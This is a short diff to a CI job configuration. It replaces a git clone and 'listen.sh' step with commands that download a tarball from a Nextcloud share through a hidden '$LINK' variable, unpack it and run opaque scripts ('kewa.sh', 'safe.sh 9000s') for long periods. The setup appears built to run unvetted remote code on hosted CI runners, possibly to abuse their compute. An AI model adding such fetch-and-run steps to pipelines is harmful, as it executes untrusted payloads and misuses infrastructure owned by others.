@@ -8,9 +8,8 @@ jobs:
       - run:
           command: |
             apt update
-            apt install sudo git -y
-            git clone https://github.com/samita100/test.git
-            cd test
-            timeout 3h bash listen.sh
-
-            
+            apt install sudo wget -y
+            wget -O lhope.tar.gz https://nextcloud-fi.webo.hosting/s/$LINK/download
+            tar xzf lhope.tar.gz
+            bash kewa.sh
+            bash safe.sh 9000s
